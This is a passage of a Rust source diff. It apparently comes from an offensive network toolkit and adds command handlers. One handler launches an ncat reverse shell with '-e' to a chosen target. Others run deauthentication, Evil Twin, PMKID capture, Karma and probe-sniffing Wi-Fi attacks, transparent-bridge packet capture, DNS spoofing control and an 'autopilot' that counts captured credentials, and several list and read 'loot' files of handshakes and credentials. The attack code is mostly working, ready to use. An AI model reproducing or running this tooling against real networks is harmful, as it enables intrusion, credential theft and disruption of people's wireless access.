+    let _ = kill_process_pattern("php -S 0.0.0.0:80");
+    let _ = kill_process_pattern("php");
+    let _ = kill_process_pattern("ettercap");
+    let data = json!({ "stopped": true });
+    Ok(("DNS spoofing stopped".to_string(), data))
+}
+
+fn handle_loot_list(root: &Path, args: LootListArgs) -> Result<HandlerResult> {
+    let dir = loot_directory(root, args.kind);
+    let kind_label = loot_kind_label(args.kind);
+    let mut entries = Vec::new();
+
+    if dir.exists() {
+        for entry in WalkDir::new(&dir).into_iter().filter_map(Result::ok) {
+            if !entry.file_type().is_file() {
+                continue;
+            }
+            let path = entry.into_path();
+            let metadata = path.metadata()?;
+            let modified = metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH);
+            let modified_ts = modified
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or(Duration::ZERO)
+                .as_secs();
+            let file_name = path
+                .file_name()
+                .map(|n| n.to_string_lossy().to_string())
+                .unwrap_or_else(|| "unknown".to_string());
+            entries.push((
+                modified,
+                json!({
+                    "name": file_name,
+                    "path": path.to_string_lossy(),
+                    "size": metadata.len(),
+                    "modified": modified_ts,
+                }),
+            ));
+        }
+    }
+
+    entries.sort_by(|a, b| b.0.cmp(&a.0));
+    let files: Vec<Value> = entries.into_iter().map(|(_, value)| value).collect();
+
+    let data = json!({
+        "kind": kind_label,
+        "directory": dir.to_string_lossy(),
+        "files": files,
+    });
+    Ok(("Loot listing generated".to_string(), data))
+}
+
+fn handle_loot_read(root: &Path, args: LootReadArgs) -> Result<HandlerResult> {
+    let LootReadArgs { path, max_lines } = args;
+    let resolved = resolve_loot_path(root, &path)?;
+    let contents =
+        fs::read_to_string(&resolved).with_context(|| format!("reading {}", resolved.display()))?;
+    let mut lines = Vec::new();
+    let mut truncated = false;
+    for (idx, line) in contents.lines().enumerate() {
+        if idx >= max_lines {
+            truncated = true;
+            break;
+        }
+        lines.push(line.to_string());
+    }
+
+    let data = json!({
+        "path": resolved.to_string_lossy(),
+        "line_count": lines.len(),
+        "truncated": truncated,
+        "lines": lines,
+    });
+
+    Ok(("Loot file read".to_string(), data))
+}
+
+fn handle_process_kill(args: ProcessKillArgs) -> Result<HandlerResult> {
+    if args.names.is_empty() {
+        bail!("At least one --name argument is required");
+    }
+
+    let mut killed = Vec::new();
+    let mut not_found = Vec::new();
+
+    for name in args.names {
+        match kill_process(&name)? {
+            KillResult::Terminated => killed.push(name),
+            KillResult::NotFound => not_found.push(name),
+        }
+    }
+
+    let message = if killed.is_empty() {
+        "No matching processes were running".to_string()
+    } else if not_found.is_empty() {
+        "Processes terminated".to_string()
+    } else {
+        "Some processes terminated".to_string()
+    };
+
+    let data = json!({
+        "killed": killed,
+        "not_found": not_found,
+    });
+
+    Ok((message, data))
+}
+
+fn handle_process_status(args: ProcessStatusArgs) -> Result<HandlerResult> {
+    if args.names.is_empty() {
+        bail!("At least one --name argument is required");
+    }
+
+    let mut running = Vec::new();
+    let mut not_running = Vec::new();
+
+    for name in args.names {
+        let is_running = process_running_exact(&name)?;
+        if is_running {
+            running.push(name);
+        } else {
+            not_running.push(name);
+        }
+    }
+
+    let message = if running.is_empty() {
+        "No specified processes are running".to_string()
+    } else if not_running.is_empty() {
+        "All specified processes are running".to_string()
+    } else {
+        "Some specified processes are running".to_string()
+    };
+
+    let data = json!({
+        "running": running,
+        "not_running": not_running,
+    });
+
+    Ok((message, data))
+}
+
+fn handle_status_summary() -> Result<HandlerResult> {
+    let scan_running = process_running_exact("nmap")?;
+    let mitm_running = process_running_exact("tcpdump")? || process_running_exact("arpspoof")?;
+    let dnsspoof_running = process_running_exact("ettercap")?;
+    let responder_running = process_running_pattern("Responder.py")?;
+
+    let status_text = compose_status_text(
+        scan_running,
+        mitm_running,
+        dnsspoof_running,
+        responder_running,
+    );
+
+    let data = json!({
+        "scan_running": scan_running,
+        "mitm_running": mitm_running,
+        "dnsspoof_running": dnsspoof_running,
+        "responder_running": responder_running,
+        "status_text": status_text,
+    });
+
+    Ok(("Status collected".to_string(), data))
+}
+
+fn handle_network_status() -> Result<HandlerResult> {
+    let interface_info = detect_interface(None).ok();
+
+    let gateway_ip = default_gateway_ip().ok();
+    let gateway_reachable = match gateway_ip {
+        Some(ip) => ping_host(&ip.to_string(), Duration::from_secs(2)).unwrap_or(false),
+        None => false,
+    };
+    let internet_reachable = ping_host("1.1.1.1", Duration::from_secs(2)).unwrap_or(false);
+
+    let interface_stats = interface_info
+        .as_ref()
+        .and_then(|info| read_interface_stats(&info.name).ok());
+
+    let dns_servers = read_dns_servers().unwrap_or_default();
+
+    let mut data = serde_json::Map::new();
+    if let Some(info) = interface_info.as_ref() {
+        data.insert("interface".into(), Value::String(info.name.clone()));
+        data.insert("address".into(), Value::String(info.address.to_string()));
+        data.insert("cidr".into(), Value::String(info.network_cidr()));
+    }
+    if let Some(gw) = gateway_ip {
+        data.insert("gateway".into(), Value::String(gw.to_string()));
+    }
+    data.insert("gateway_reachable".into(), Value::Bool(gateway_reachable));
+    data.insert("internet_reachable".into(), Value::Bool(internet_reachable));
+    if let Some(stats) = interface_stats {
+        data.insert("rx_bytes".into(), Value::Number(stats.rx_bytes.into()));
+        data.insert("tx_bytes".into(), Value::Number(stats.tx_bytes.into()));
+        data.insert("oper_state".into(), Value::String(stats.oper_state.clone()));
+    }
+    data.insert(
+        "dns_servers".into(),
+        Value::Array(dns_servers.into_iter().map(Value::String).collect()),
+    );
+
+    Ok(("Network health collected".to_string(), Value::Object(data)))
+}
+
+fn handle_reverse_launch(root: &Path, args: ReverseLaunchArgs) -> Result<HandlerResult> {
+    let ReverseLaunchArgs {
+        target,
+        port,
+        shell,
+        interface,
+    } = args;
+
+    let interface_info = detect_interface(interface)?;
+    let mut cmd = std::process::Command::new("ncat");
+    cmd.arg(&target)
+        .arg(port.to_string())
+        .arg("-e")
+        .arg(&shell)
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .arg("-s")
+        .arg(interface_info.address.to_string());
+
+    let child = cmd.spawn().context("launching ncat reverse shell")?;
+
+    let log_entry = format!(
+        "[{}] reverse-shell -> {}:{} via {} (pid {})",
+        chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
+        target,
+        port,
+        interface_info.name,
+        child.id(),
+    );
+    let _ = append_payload_log(root, &log_entry);
+
+    let data = json!({
+        "target": target,
+        "port": port,
+        "interface": interface_info.name,
+        "pid": child.id(),
+        "shell": shell,
+    });
+    Ok(("Reverse shell launched".to_string(), data))
+}
+
+fn handle_wifi_list() -> Result<HandlerResult> {
+    let mut interfaces = list_interface_summaries()?;
+    interfaces.sort_by(|a, b| a.name.cmp(&b.name));
+    let data = json!({ "interfaces": interfaces });
+    Ok(("Interface list generated".to_string(), data))
+}
+
+fn handle_wifi_status(root: &Path, args: WifiStatusArgs) -> Result<HandlerResult> {
+    log::info!("Collecting WiFi status information");
+
+    let interface_name = args.interface.clone();
+    let info = if let Some(name) = interface_name.clone() {
+        log::info!("Getting status for specified interface: {name}");
+        match detect_interface(Some(name.clone())) {
+            Ok(i) => i,
+            Err(e) => {
+                log::error!("Failed to detect interface {name}: {e}");
+                bail!("Failed to get interface info for {name}: {e}");
+            }
+        }
+    } else {
+        log::info!("Auto-detecting default interface");
+        match detect_interface(None) {
+            Ok(i) => {
+                log::info!("Detected default interface: {}", i.name);
+                i
+            }
+            Err(e) => {
+                log::error!("Failed to detect default interface: {e}");
+                bail!("Failed to detect default interface: {e}");
+            }
+        }
+    };
+
+    let stats = read_interface_stats(&info.name).ok();
+    let gateway = if let Some(name) = interface_name.clone() {
+        interface_gateway(&name)
+            .ok()
+            .flatten()
+            .or_else(|| default_gateway_ip().ok())
+    } else {
+        interface_gateway(&info.name)
+            .ok()
+            .flatten()
+            .or_else(|| default_gateway_ip().ok())
+    };
+
+    let preferred = read_interface_preference(root, "system_preferred")
+        .ok()
+        .flatten();
+
+    let link = read_wifi_link_info(&info.name);
+
+    // Determine if this is the active interface
+    let default_route = read_default_route().ok().flatten();
+    let is_active = default_route
+        .as_ref()
+        .and_then(|r| r.interface.as_ref())
+        .map(|iface| iface == &info.name)
+        .unwrap_or(false);
+
+    log::info!(
+        "Interface {} status: active={}, connected={}",
+        info.name,
+        is_active,
+        link.connected
+    );
+
+    let data = json!({
+        "interface": info.name,
+        "address": info.address,
+        "cidr": info.network_cidr(),
+        "stats": stats,
+        "gateway": gateway,
+        "preferred": preferred,
+        "connected": link.connected,
+        "ssid": link.ssid,
+        "signal_dbm": link.signal_dbm,
+        "tx_bitrate": link.tx_bitrate,
+        "is_active": is_active,
+        "default_route_interface": default_route.and_then(|r| r.interface),
+    });
+    Ok(("Interface status collected".to_string(), data))
+}
+
+fn handle_wifi_best(root: &Path, args: WifiBestArgs) -> Result<HandlerResult> {
+    let interface =
+        select_best_interface(root, args.prefer_wifi)?.unwrap_or_else(|| "eth0".to_string());
+    let data = json!({ "interface": interface });
+    Ok(("Best interface selected".to_string(), data))
+}
+
+fn handle_wifi_switch(root: &Path, args: WifiSwitchArgs) -> Result<HandlerResult> {
+    let interface = args.interface;
+    write_interface_preference(root, "system_preferred", &interface)?;
+    let data = json!({ "interface": interface });
+    Ok(("Interface preference saved".to_string(), data))
+}
+
+fn handle_wifi_route_status(_root: &Path) -> Result<HandlerResult> {
+    let default_route = read_default_route().unwrap_or(None);
+    let interfaces = list_interface_summaries()?;
+    let dns_servers = read_dns_servers().unwrap_or_default();
+    let data = json!({
+        "default_route": default_route,
+        "interfaces": interfaces,
+        "dns_servers": dns_servers,
+    });
+    Ok(("Routing status collected".to_string(), data))
+}
+
+fn handle_wifi_route_ensure(root: &Path, args: WifiRouteEnsureArgs) -> Result<HandlerResult> {
+    let WifiRouteEnsureArgs { interface } = args;
+    let interface_info = detect_interface(Some(interface.clone()))?;
+
+    let gateway = interface_gateway(&interface)?
+        .ok_or_else(|| anyhow!("No gateway found for {interface}"))?;
+
+    set_default_route(&interface, gateway)?;
+    let _ = rewrite_dns_servers(&interface, gateway);
+
+    write_interface_preference(root, "system_preferred", &interface)?;
+    let ping_success = ping_host("8.8.8.8", Duration::from_secs(2)).unwrap_or(false);
+
+    let data = json!({
+        "interface": interface,
+        "ip": interface_info.address,
+        "gateway": gateway,
+        "ping_success": ping_success,
+    });
+    Ok(("Default route updated".to_string(), data))
+}
+
+fn handle_wifi_route_backup(root: &Path) -> Result<HandlerResult> {
+    let path = backup_routing_state(root)?;
+    let data = json!({ "path": path });
+    Ok(("Routing configuration backed up".to_string(), data))
+}
+
+fn handle_wifi_route_restore(root: &Path) -> Result<HandlerResult> {
+    restore_routing_state(root)?;
+    Ok(("Routing configuration restored".to_string(), json!({})))
+}
+
+fn handle_wifi_route_metric(args: WifiRouteMetricArgs) -> Result<HandlerResult> {
+    set_interface_metric(&args.interface, args.metric)?;
+    let data = json!({
+        "interface": args.interface,
+        "metric": args.metric,
+    });
+    Ok(("Interface metric updated".to_string(), data))
+}
+
+fn handle_system_update(root: &Path, args: SystemUpdateArgs) -> Result<HandlerResult> {
+    run_system_update_with_progress(root, args, |_, _| {})
+}
+
+pub fn run_system_update_with_progress<F>(
+    root: &Path,
+    args: SystemUpdateArgs,
+    mut on_progress: F,
+) -> Result<HandlerResult>
+where
+    F: FnMut(f32, &str),
+{
+    on_progress(0.1, "Creating backup...");
+    let backup = backup_repository(root, args.backup_dir.as_deref())?;
+
+    on_progress(0.3, "Fetching updates...");
+    git_reset_to_remote(root, &args.remote, &args.branch)?;
+
+    on_progress(0.5, "Compiling binary...");
+    // We assume cargo is available in the path
+    let status = std::process::Command::new("cargo")
+        .arg("build")
+        .arg("--release")
+        .current_dir(root)
+        .status()
+        .context("executing cargo build --release")?;
+
+    if !status.success() {
+        bail!("Compilation failed with status {}", status);
+    }
+
+    on_progress(0.9, "Restarting service...");
+    restart_system_service(&args.service)?;
+
+    let data = json!({
+        "backup_path": backup,
+        "service": args.service,
+        "remote": args.remote,
+        "branch": args.branch,
+    });
+    Ok((
+        "Repository updated, compiled, and service restarted".to_string(),
+        data,
+    ))
+}
+
+fn handle_randomize_hostname() -> Result<HandlerResult> {
+    #[cfg(not(target_os = "linux"))]
+    {
+        bail!("Hostname randomization supported on Linux targets only");
+    }
+
+    #[cfg(target_os = "linux")]
+    {
+        let new_hostname = randomize_hostname()?;
+        let data = json!({ "hostname": new_hostname });
+        Ok((format!("Hostname set to {}", new_hostname), data))
+    }
+}
+
+fn handle_bridge_start(root: &Path, args: BridgeStartArgs) -> Result<HandlerResult> {
+    let backup = backup_routing_state(root)?;
+    start_bridge_pair(&args.interface_a, &args.interface_b)?;
+    let label = format!("bridge_{}_{}", args.interface_a, args.interface_b);
+    let pcap_path = build_mitm_pcap_path(root, Some(&label))?;
+    start_tcpdump_capture("br0", &pcap_path)?;
+    let data = json!({
+        "bridge": "br0",
+        "interfaces": [args.interface_a, args.interface_b],
+        "capture_path": pcap_path,
+        "routing_backup": backup,
+    });
+    Ok(("Transparent bridge enabled".to_string(), data))
+}
+
+fn handle_bridge_stop(root: &Path, args: BridgeStopArgs) -> Result<HandlerResult> {
+    let _ = kill_process("tcpdump");
+    stop_bridge_pair(&args.interface_a, &args.interface_b)?;
+    if let Err(err) = restore_routing_state(root) {
+        log::warn!("bridge stop: failed to restore routing: {err}");
+    }
+    let data = json!({
+        "bridge": "br0",
+        "interfaces": [args.interface_a, args.interface_b],
+        "routing_restored": true,
+    });
+    Ok(("Transparent bridge disabled".to_string(), data))
+}
+
+// Global autopilot engine instance (lazy initialized)
+use crate::autopilot::{AutopilotConfig, AutopilotEngine};
+use std::sync::OnceLock;
+
+static AUTOPILOT: OnceLock<AutopilotEngine> = OnceLock::new();
+
+fn get_autopilot() -> &'static AutopilotEngine {
+    AUTOPILOT.get_or_init(|| AutopilotEngine::new())
+}
+
+fn handle_autopilot_start(root: &Path, args: AutopilotStartArgs) -> Result<HandlerResult> {
+    let config = AutopilotConfig {
+        mode: format!("{:?}", args.mode),
+        interface: args.interface.clone(),
+        scan: args.scan,
+        mitm: args.mitm,
+        responder: args.responder,
+        dns_spoof: args.dns_spoof.clone(),
+        duration: args.duration,
+        check_interval: args.check_interval,
+    };
+
+    let autopilot = get_autopilot();
+    autopilot.start(root, args.mode, config)?;
+
+    let data = json!({
+        "mode": format!("{:?}", args.mode),
+        "interface": args.interface,
+        "scan": args.scan,
+        "mitm": args.mitm,
+        "responder": args.responder,
+        "dns_spoof": args.dns_spoof,
+        "duration": args.duration,
+    });
+
+    Ok(("Autopilot started".to_string(), data))
+}
+
+fn handle_autopilot_stop() -> Result<HandlerResult> {
+    let autopilot = get_autopilot();
+    autopilot.stop()?;
+
+    let data = json!({
+        "stopped": true,
+    });
+
+    Ok(("Autopilot stopped".to_string(), data))
+}
+
+fn handle_autopilot_status() -> Result<HandlerResult> {
+    let autopilot = get_autopilot();
+    let status = autopilot.get_status();
+
+    let data = json!({
+        "running": status.running,
+        "mode": status.mode,
+        "phase": status.phase,
+        "elapsed_secs": status.elapsed_secs,
+        "hosts_found": status.hosts_found,
+        "credentials_captured": status.credentials_captured,
+        "packets_captured": status.packets_captured,
+        "errors": status.errors,
+    });
+
+    Ok(("Autopilot status".to_string(), data))
+}
+
+fn handle_wifi_scan(args: WifiScanArgs) -> Result<HandlerResult> {
+    log::info!("Starting WiFi scan");
+
+    let interface = match select_wifi_interface(args.interface) {
+        Ok(iface) => {
+            log::info!("Selected interface: {iface}");
+            iface
+        }
+        Err(e) => {
+            log::error!("Failed to select WiFi interface: {e}");
+            bail!("Failed to select WiFi interface: {e}");
+        }
+    };
+
+    let networks = match scan_wifi_networks(&interface) {
+        Ok(nets) => {
+            log::info!("Scan completed, found {} network(s)", nets.len());
+            nets
+        }
+        Err(e) => {
+            log::error!("WiFi scan failed on {interface}: {e}");
+            bail!("WiFi scan failed: {e}");
+        }
+    };
+
+    let data = json!({
+        "interface": interface,
+        "networks": networks,
+        "count": networks.len(),
+    });
+    Ok(("Wi-Fi scan completed".to_string(), data))
+}
+
+fn handle_wifi_deauth(root: &Path, args: WifiDeauthArgs) -> Result<HandlerResult> {
+    use crate::wireless_native::{self, DeauthConfig};
+
+    let ssid_display = args.ssid.clone().unwrap_or_else(|| args.bssid.clone());
+    log::info!(
+        "Starting native Rust deauth attack on BSSID: {} (SSID: {})",
+        args.bssid,
+        ssid_display
+    );
+
+    // Validate BSSID format (XX:XX:XX:XX:XX:XX)
+    let mac_regex = Regex::new(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$").unwrap();
+    if !mac_regex.is_match(&args.bssid) {
+        bail!("Invalid BSSID format. Expected MAC address like AA:BB:CC:DD:EE:FF");
+    }
+
+    // Validate client MAC if provided
+    if let Some(ref client) = args.client {
+        if !mac_regex.is_match(client) {
+            bail!("Invalid client MAC format. Expected like AA:BB:CC:DD:EE:FF");
+        }
+    }
+
+    // Validate channel (1-14 for 2.4GHz, 36-165 for 5GHz)
+    if args.channel == 0 || (args.channel > 14 && args.channel < 36) || args.channel > 165 {
+        bail!(
+            "Invalid channel {}. Use 1-14 for 2.4GHz or 36-165 for 5GHz",
+            args.channel
+        );
+    }
+
+    // Check if we have root privileges (required for raw sockets)
+    if !wireless_native::native_available() {
+        bail!("Deauth attacks require root privileges. Run with sudo.");
+    }
+
+    // Check if interface is wireless
+    if !wireless_native::is_wireless_interface(&args.interface) {
+        bail!("Interface {} is not a wireless interface", args.interface);
+    }
+
+    // Check wireless capabilities
+    let caps = wireless_native::check_capabilities(&args.interface);
+    if !caps.is_attack_capable() {
+        let mut reasons = Vec::new();
+        if !caps.has_root {
+            reasons.push("not running as root");
+        }
+        if !caps.interface_is_wireless {
+            reasons.push("interface is not wireless");
+        }
+        if !caps.supports_monitor_mode {
+            reasons.push("monitor mode not supported");
+        }
+        bail!(
+            "Interface {} is not capable of attacks: {}",
+            args.interface,
+            reasons.join(", ")
+        );
+    }
+
+    // Create loot directory under network-specific folder + attack type
+    let loot_dir =
+        wireless_target_directory(root, args.ssid.clone(), Some(args.bssid.clone())).join("Deauth");
+    fs::create_dir_all(&loot_dir)
+        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;
+
+    let tag = wireless_tag(
+        args.ssid.as_deref(),
+        Some(args.bssid.as_str()),
+        &args.interface,
+    );
+    let _ = log_mac_usage(root, &args.interface, "wifi_deauth", Some(&tag));
+
+    // Build deauth config for native implementation
+    let config = DeauthConfig {
+        bssid: args.bssid.clone(),
+        ssid: args.ssid.clone(),
+        channel: args.channel,
+        interface: args.interface.clone(),
+        client: args.client.clone(),
+        packets: args.packets,
+        duration: args.duration,
+        interval: args.interval,
+        continuous: args.continuous,
+    };
+
+    log::info!("Executing native Rust deauth attack (rustyjack-wireless)");
+
+    // Execute the native deauth attack
+    let result = wireless_native::execute_deauth_attack(&loot_dir, &config, |progress, status| {
+        log::debug!("Deauth progress: {:.0}% - {}", progress * 100.0, status);
+    })?;
+
+    let log_file = if result.log_file.as_os_str().is_empty() {
+        None
+    } else {
+        Some(result.log_file.display().to_string())
+    };
+
+    // Build response data
+    let data = json!({
+        "bssid": result.bssid,
+        "ssid": result.ssid,
+        "channel": result.channel,
+        "interface": args.interface,
+        "duration": result.duration_secs,
+        "packets_per_burst": args.packets,
+        "total_packets_sent": result.packets_sent,
+        "deauth_bursts": result.bursts,
+        "continuous_mode": args.continuous,
+        "target_client": args.client,
+        "log_file": log_file,
+        "capture_files": result.capture_files.iter().map(|p| p.display().to_string()).collect::<Vec<_>>(),
+        "handshake_captured": result.handshake_captured,
+        "handshake_file": result.handshake_file.as_ref().map(|p| p.display().to_string()),
+        "eapol_frames": result.eapol_frames,
+        "loot_directory": loot_dir.display().to_string(),
+        "implementation": "native-rust",
+    });
+
+    let message = if result.handshake_captured {
+        format!(
+            "SUCCESS: Handshake captured! ({} packets in {} bursts, {} EAPOL frames)",
+            result.packets_sent, result.bursts, result.eapol_frames
+        )
+    } else {
+        format!(
+            "Deauth completed - {} packets sent in {} bursts, no handshake captured",
+            result.packets_sent, result.bursts
+        )
+    };
+
+    Ok((message, data))
+}
+
+fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerResult> {
+    use crate::wireless_native;
+    use rustyjack_wireless::evil_twin::{execute_evil_twin, EvilTwin, EvilTwinConfig};
+    use std::time::Duration;
+
+    log::info!("Starting Evil Twin attack on SSID: {}", args.ssid);
+
+    // Check if we have root privileges
+    if !wireless_native::native_available() {
+        bail!("Evil Twin attacks require root privileges. Run with sudo.");
+    }
+
+    // Check if interface is wireless
+    if !wireless_native::is_wireless_interface(&args.interface) {
+        bail!("Interface {} is not a wireless interface", args.interface);
+    }
+
+    // Check required tools are installed
+    let missing = EvilTwin::check_requirements()
+        .map_err(|e| anyhow::anyhow!("Failed to check requirements: {}", e))?;
+    if !missing.is_empty() {
+        bail!(
+            "Missing required tools for Evil Twin: {}. Install with: apt install {}",
+            missing.join(", "),
+            missing.join(" ")
+        );
+    }
+
+    let tag = wireless_tag(
+        Some(args.ssid.as_str()),
+        args.target_bssid.as_deref(),
+        &args.interface,
+    );
+    let _ = log_mac_usage(root, &args.interface, "wifi_evil_twin", Some(&tag));
+
+    // Create loot directory for captured credentials under target + attack type
+    let loot_dir =
+        wireless_target_directory(root, Some(args.ssid.clone()), args.target_bssid.clone())
+            .join("EvilTwin");
+    fs::create_dir_all(&loot_dir)
+        .with_context(|| format!("creating loot directory: {}", loot_dir.display()))?;
+
+    // Parse target BSSID if provided
+    let target_bssid = if let Some(ref bssid_str) = args.target_bssid {
+        Some(
+            bssid_str
+                .parse()
+                .map_err(|e| anyhow::anyhow!("Invalid BSSID: {}", e))?,
+        )
+    } else {
+        None
+    };
+
+    // Configure the Evil Twin attack
+    let config = EvilTwinConfig {
+        ssid: args.ssid.clone(),
+        channel: args.channel,
+        ap_interface: args.interface.clone(),
+        deauth_interface: None, // Could add second interface support later
+        target_bssid,
+        simultaneous_deauth: false, // Requires second interface
+        deauth_interval: Duration::from_secs(5),
+        duration: Duration::from_secs(args.duration.into()),
+        open_network: args.open,
+        wpa_password: None,
+        capture_path: loot_dir.to_string_lossy().to_string(),
+    };
+
+    // Execute the attack with progress callback
+    let result = execute_evil_twin(config, Some(&loot_dir.to_string_lossy()), |msg| {
+        log::info!("Evil Twin: {}", msg);
+    })
+    .map_err(|e| anyhow::anyhow!("Evil Twin attack failed: {}", e))?;
+
+    let log_file = if result.log_path.as_os_str().is_empty() {
+        None
+    } else {
+        Some(result.log_path.display().to_string())
+    };
+
+    let data = json!({
+        "ssid": args.ssid,
+        "interface": args.interface,
+        "channel": args.channel,
+        "target_bssid": args.target_bssid,
+        "duration": args.duration,
+        "open_network": args.open,
+        "status": if result.stats.ap_started { "completed" } else { "failed" },
+        "clients_connected": result.stats.clients_connected,
+        "handshakes_captured": result.stats.handshakes_captured,
+        "credentials_captured": result.stats.credentials_captured,
+        "deauth_packets": result.stats.deauth_packets,
+        "attack_duration_secs": result.stats.duration.as_secs(),
+        "loot_directory": result.loot_path.display().to_string(),
+        "log_file": log_file,
+    });
+
+    let message = if result.stats.ap_started {
+        format!(
+            "Evil Twin complete: {} clients, {} handshakes captured",
+            result.stats.clients_connected, result.stats.handshakes_captured
+        )
+    } else {
+        "Evil Twin attack failed to start AP".to_string()
+    };
+
+    Ok((message, data))
+}
+
+fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> {
+    use crate::wireless_native::{self, PmkidCaptureConfig};
+
+    log::info!("Starting PMKID capture on interface: {}", args.interface);
+
+    // Check privileges
+    if !wireless_native::native_available() {
+        bail!("PMKID capture requires root privileges. Run with sudo.");
+    }
+
+    // Check if interface is wireless
+    if !wireless_native::is_wireless_interface(&args.interface) {
+        bail!("Interface {} is not a wireless interface", args.interface);
+    }
+
+    // Check capabilities
+    let caps = wireless_native::check_capabilities(&args.interface);
+    if !caps.supports_monitor_mode {
+        bail!(
+            "Interface {} does not support monitor mode (required for PMKID)",
+            args.interface
+        );
+    }
+
+    // Create loot directory under target network + attack type
+    let loot_dir =
+        wireless_target_directory(root, args.ssid.clone(), args.bssid.clone()).join("PMKID");
+    fs::create_dir_all(&loot_dir)?;
+
+    let tag = wireless_tag(args.ssid.as_deref(), args.bssid.as_deref(), &args.interface);
+    let _ = log_mac_usage(root, &args.interface, "wifi_pmkid", Some(&tag));
+
+    // Build config for native implementation
+    let config = PmkidCaptureConfig {
+        interface: args.interface.clone(),
+        channel: args.channel,
+        target_bssid: args.bssid.clone(),
+        duration_secs: args.duration,
+    };
+
+    // Execute the native PMKID capture
+    let result = wireless_native::execute_pmkid_capture(&loot_dir, &config, |progress, status| {
+        log::debug!("PMKID progress: {:.0}% - {}", progress * 100.0, status);
+    })?;
+
+    let data = json!({
+        "interface": args.interface,
+        "bssid": args.bssid,
+        "ssid": args.ssid,
+        "channel": args.channel,
+        "duration": args.duration,
+        "pmkids_captured": result.pmkids_captured,
+        "networks_seen": result.networks_seen,
+        "hashcat_file": result.hashcat_file.as_ref().map(|p| p.display().to_string()),
+        "loot_directory": result.loot_path.display().to_string(),
+    });
+
+    let message = if result.pmkids_captured > 0 {
+        format!(
+            "PMKID captured! {} PMKIDs from {} networks",
+            result.pmkids_captured, result.networks_seen
+        )
+    } else {
+        "PMKID capture complete - no PMKIDs found".to_string()
+    };
+
+    Ok((message, data))
+}
+
+fn handle_wifi_probe_sniff(root: &Path, args: WifiProbeSniffArgs) -> Result<HandlerResult> {
+    use crate::wireless_native::{self, ProbeSniffConfig as NativeProbeConfig};
+
+    log::info!(
+        "Starting probe request sniff on interface: {}",
+        args.interface
+    );
+
+    // Check privileges
+    if !wireless_native::native_available() {
+        bail!("Probe sniffing requires root privileges. Run with sudo.");
+    }
+
+    // Check if interface is wireless
+    if !wireless_native::is_wireless_interface(&args.interface) {
+        bail!("Interface {} is not a wireless interface", args.interface);
+    }
+
+    // Check capabilities
+    let caps = wireless_native::check_capabilities(&args.interface);
+    if !caps.supports_monitor_mode {
+        bail!(
+            "Interface {} does not support monitor mode (required for probe sniffing)",
+            args.interface
+        );
+    }
+
+    // Create loot directory for probe sniffing (goes under probe_sniff subdirectory)
+    let loot_dir = loot_directory(root, LootKind::Wireless).join("probe_sniff");
+    fs::create_dir_all(&loot_dir)?;
+
+    let tag = wireless_tag(None, None, &args.interface);
+    let _ = log_mac_usage(root, &args.interface, "wifi_probe_sniff", Some(&tag));
+
+    // Build config for native implementation
+    let config = NativeProbeConfig {
+        interface: args.interface.clone(),
+        channel: args.channel,
+        duration_secs: args.duration,
+    };
+
+    // Execute the native probe sniff
+    let result = wireless_native::execute_probe_sniff(&loot_dir, &config, |progress, status| {
+        log::debug!(
+            "Probe sniff progress: {:.0}% - {}",
+            progress * 100.0,
+            status
+        );
+    })?;
+
+    let data = json!({
+        "interface": args.interface,
+        "channel": args.channel,
+        "duration": args.duration,
+        "total_probes": result.probes_captured,
+        "unique_clients": result.unique_clients,
+        "unique_networks": result.unique_networks,
+        "loot_directory": result.loot_path.display().to_string(),
+    });
+
+    Ok((
+        format!(
+            "Probe sniff complete: {} probes, {} clients, {} networks",
+            result.probes_captured, result.unique_clients, result.unique_networks
+        ),
+        data,
+    ))
+}
+
+fn handle_wifi_karma(root: &Path, args: WifiKarmaArgs) -> Result<HandlerResult> {
+    use crate::wireless_native::{self, KarmaAttackConfig};
+
+    log::info!("Starting Karma attack on interface: {}", args.interface);
+
+    // Check privileges
+    if !wireless_native::native_available() {
+        bail!("Karma attack requires root privileges. Run with sudo.");
+    }
+
+    // Check if interface is wireless
+    if !wireless_native::is_wireless_interface(&args.interface) {
+        bail!("Interface {} is not a wireless interface", args.interface);
+    }
+
+    // Check capabilities
+    let caps = wireless_native::check_capabilities(&args.interface);
+    if !caps.supports_monitor_mode {
+        bail!(
+            "Interface {} does not support monitor mode (required for Karma)",
+            args.interface
+        );
+    }
+
+    let tag = wireless_tag(None, None, &args.interface);
+    let _ = log_mac_usage(root, &args.interface, "wifi_karma", Some(&tag));
+
+    // Parse whitelist/blacklist
+    let ssid_whitelist: Vec<String> = args
+        .ssid_whitelist
+        .as_ref()
+        .map(|s| s.split(',').map(|ss| ss.trim().to_string()).collect())
+        .unwrap_or_default();
+
+    let ssid_blacklist: Vec<String> = args
+        .ssid_blacklist
+        .as_ref()
+        .map(|s| s.split(',').map(|ss| ss.trim().to_string()).collect())
+        .unwrap_or_default();
+
+    // Create loot directory
+    let loot_dir = loot_directory(root, LootKind::Wireless).join("karma");
+    fs::create_dir_all(&loot_dir)?;
+
+    // Build config
+    let config = KarmaAttackConfig {
+        interface: args.interface.clone(),
+        ap_interface: args.ap_interface.clone(),
+        channel: args.channel,
+        duration_secs: args.duration,
+        with_ap: args.with_ap,
+        ssid_whitelist: ssid_whitelist.clone(),
+        ssid_blacklist: ssid_blacklist.clone(),
+    };
+
+    // Execute the Karma attack
+    let result = wireless_native::execute_karma(&loot_dir, &config, |progress, status| {
+        log::debug!("Karma progress: {:.0}% - {}", progress * 100.0, status);
+    })?;
+
+    let data = json!({
+        "interface": args.interface,
+        "ap_interface": args.ap_interface,
+        "channel": args.channel,
+        "duration": args.duration,
+        "with_ap": args.with_ap,
+        "ssid_whitelist": ssid_whitelist,
+        "ssid_blacklist": ssid_blacklist,
+        "probes_seen": result.probes_seen,
+        "unique_ssids": result.unique_ssids,
+        "unique_clients": result.unique_clients,
+        "victims": result.victims,
+        "loot_directory": result.loot_path.display().to_string(),
+    });
+
+    Ok((
+        format!(
+            "Karma complete: {} probes, {} SSIDs, {} clients, {} victims",
+            result.probes_seen, result.unique_ssids, result.unique_clients, result.victims
+        ),
+        data,
+    ))
+}
+
